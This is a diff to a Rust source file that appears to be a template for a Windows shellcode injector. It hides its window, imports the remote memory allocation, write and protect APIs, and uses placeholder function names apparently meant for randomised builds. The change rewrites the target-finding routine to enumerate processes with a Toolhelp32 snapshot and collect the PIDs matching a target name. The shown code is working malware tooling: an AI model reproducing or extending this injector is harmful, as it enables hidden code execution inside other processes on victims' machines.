@@ -1,8 +1,12 @@
 #![windows_subsystem = "windows"]
 #![allow(non_snake_case)]
 
-use sysinfo::System;
+use windows::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
 use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
+use windows::Win32::System::Diagnostics::ToolHelp::{
+    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
+    PROCESSENTRY32W, TH32CS_SNAPPROCESS,
+};
 use windows::Win32::System::Memory::VirtualAllocEx;
 use windows::Win32::System::Memory::VirtualProtectEx;
 use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
@@ -25,13 +29,33 @@ use std::thread;
 
 fn {{FN_FIND_PID}}(tar: &str) -> Vec<usize> {
     let mut dom: Vec<usize> = Vec::new();
-    let s = System::new_all();
     let tar_lower = tar.to_lowercase();
-    for (_, pro) in s.processes() {
-        if pro.name().to_string_lossy().to_lowercase() == tar_lower {
-            dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
+
+    unsafe {
+        let snapshot = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
+            Ok(h) if h != INVALID_HANDLE_VALUE => h,
+            _ => return dom,
+        };
+
+        let mut entry: PROCESSENTRY32W = core::mem::zeroed();
+        entry.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
+
+        if Process32FirstW(snapshot, &mut entry).is_ok() {
+            loop {
+                let len = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len());
+                let name = String::from_utf16_lossy(&entry.szExeFile[..len]);
+                if name.to_lowercase() == tar_lower {
+                    dom.push(entry.th32ProcessID as usize);
+                }
+                if Process32NextW(snapshot, &mut entry).is_err() {
+                    break;
+                }
+            }
         }
+
+        let _ = CloseHandle(snapshot);
     }
+
     dom
 }
 
